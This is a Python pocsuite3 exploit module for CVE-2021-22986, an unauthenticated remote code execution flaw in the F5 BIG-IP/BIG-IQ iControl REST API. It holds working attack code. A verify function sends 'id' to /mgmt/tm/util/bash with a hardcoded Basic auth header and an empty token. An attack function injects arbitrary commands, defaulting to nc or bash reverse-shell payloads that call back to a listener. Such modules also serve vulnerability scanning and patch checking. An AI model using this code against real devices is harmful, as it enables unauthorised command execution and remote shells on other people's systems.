from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import json
class DemoPOC(POCBase):
    vulID = 'CVE-2021-22986'  # ssvid
    version = '1.0'
    name = 'F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞'
    appName = 'F5'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2021年3月10日，阿里云应急响应中心监测到F5官方发布安全通告，修复了包括 CVE-2021-22986 BIG-IP iControl REST 未授权远程代码执行漏洞在内的多个严重高危漏洞。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
            'Content-Type': 'application/json',
            'X-F5-Auth-Token': '',
            'Authorization': 'Basic YWRtaW46QVNhc1M='
        }
        data = {'command': "run",'utilCmdArgs':"-c id"}
        try:
            target = self.url+"/mgmt/tm/util/bash"
            r = requests.post(url=target, json=data, headers=headers, verify=False, timeout=5)
            if r.status_code == 200 and "commandResult" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self): #交互式command
        result = {}
        cmd = self.get_option("command")
        print(cmd)
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                'Content-Type': 'application/json',
                'X-F5-Auth-Token': '',
                'Authorization': 'Basic YWRtaW46QVNhc1M='
            }
            target = self.url+"/mgmt/tm/util/bash"
            data = {'command': "run",'utilCmdArgs':"-c '{0}'".format(cmd)}
            r = requests.post(url=target,timeout=5,verify=False,json=data,headers=headers)
            default = json.loads(r.text)
            resu = default['commandResult']
            result['verifyInfo']={}
            result['verifyInfo']['Payload'] = data
            return self.parse_output(result)
        except:
        	return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)